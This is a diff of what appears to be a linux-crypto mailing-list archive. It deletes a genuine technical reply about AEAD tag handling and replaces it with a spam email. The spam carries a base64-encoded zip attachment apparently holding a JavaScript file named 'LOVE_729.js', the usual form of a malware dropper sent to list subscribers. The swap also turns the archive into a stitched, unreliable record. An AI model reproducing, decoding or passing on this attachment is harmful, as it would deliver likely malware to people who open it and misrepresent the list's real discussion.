@@ -1,82 +1,125 @@
-From: Stephan Mueller <smueller@chronox.de>
-Subject: Re: [PATCH] crypto: fix AEAD tag memory handling
-Date: Mon, 31 Oct 2016 11:11:33 +0100
-Message-ID: <2822295.gL4fqFHz8h@positron.chronox.de>
-References: <4006219.iWaCqWYv1B@positron.chronox.de> <4087872.10iu4A8UFE@tauon.atsec.com> <alpine.OSX.2.20.1610281501490.9348@mjmartin-mac01.wa.intel.com>
+From: <douille.l@hotmail.fr>
+Subject: 51407843978 linux-crypto
+Date: Mon, 31 Oct 2016 12:05:39 -0000
+Message-ID: <147791553913.22322.4029089849085914145@hinet.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7Bit
-Cc: herbert@gondor.apana.org.au, linux-crypto@vger.kernel.org
-To: Mat Martineau <mathew.j.martineau@linux.intel.com>
+Content-Type: application/zip; name="aelinux-crypto.zip"
+Content-Transfer-Encoding: base64
+To: <linux-crypto@vger.kernel.org>
 Return-path: <linux-crypto-owner@vger.kernel.org>
-Received: from mail.eperm.de ([89.247.134.16]:47052 "EHLO mail.eperm.de"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1764425AbcJaKLl (ORCPT <rfc822;linux-crypto@vger.kernel.org>);
-        Mon, 31 Oct 2016 06:11:41 -0400
-In-Reply-To: <alpine.OSX.2.20.1610281501490.9348@mjmartin-mac01.wa.intel.com>
+Received: from 114-35-100-70.HINET-IP.hinet.net ([114.35.100.70]:55672 "HELO
+        hinet.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S941379AbcJaMFp (ORCPT <rfc822;linux-crypto@vger.kernel.org>);
+        Mon, 31 Oct 2016 08:05:45 -0400
+Content-Disposition: attachment
 Sender: linux-crypto-owner@vger.kernel.org
 List-ID: <linux-crypto.vger.kernel.org>
 
-Am Freitag, 28. Oktober 2016, 15:21:19 CET schrieb Mat Martineau:
-
-Hi Mat,
-> > 
-> > Please check the current patch (the one I sent to you as a pre-release did
-> > not contain the fix for the decryption part -- the patch sent to the list
-> > and what we discuss here contains the appropriate handling for the
-> > decryption side).
-> > 
-> > With your example using 16 bytes AAD, 16 bytes CT and 16 bytes Tag, the
-> > read will *only* show the return code of 16 (bytes) now, because only the
-> > CT part is converted into PT.
-> > 
-> > Yet, you are completely correct that the first 16 bytes of the AAD are
-> > skipped by the read call.
-> > 
-> > Thus, the read call returns exactly the amount of changed bytes, but it
-> > deviates from the POSIX logic by seeking to the end of the AAD buffer to
-> > find the offset it shall place the resulting data to.
-> 
-> I re-built my kernel using the patch from this email thread, and I still
-> see the total read() length including the "skipped" AAD byte count. Here's
-> an strace excerpt for a decrypt operation with AAD length of 32 and
-> plaintext length of 32:
-
-That is absolutely correct as the patch' intention is to avoid the 
-superflowous Tag memory consideration for input data during encryption and for 
-output data for decryption. This prevents the kernel from reading/writing 
-memory that it does not need to touch.
-
-The patch is not intended for coverting the AAD you reported. Though, I am not 
-yet sure about whether we need to cover that aspect. My interpretation is that 
-the kernel is responsible for the entire memory of AAD || PT/CT and 
-potentially the tag. If the kernel sees that it does not need to change the 
-AAD, it will not do that and simply change the parts of the buffer it needs 
-to. Then, the kernel reports the changed bytes.
-
-Note, if we change the kernel to operate as you suggest, there is more memory 
-re-calculation operation in the kernel as well as in user space. To me, that 
-is an invtation to errors. Besides, I see that only as an interpretation of 
-how POSIX is to be applied.
-
-However, I can make another proposal: we change the read/recv handler such 
-that it returns the actually processed memory, regardless whether it really 
-touched it. I.e. read will return the following bytes in its return code:
-
-- encryption: AAD + CT + Tag
-
-- decryption: AAD + PT
-
-Even though read would report that amount of memory, we all know that the AAD 
-part will not be actually written. Yet, the kernel returns the amount of bytes 
-it processed.
-
-Regardless, all of this discussion revolves around a topic that is separate to 
-this patch. I.e. this patch was not intended to handle the AAD. This patch is 
-only provided to handle the tag.
-
-...
-
-
-Ciao
-Stephan
+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
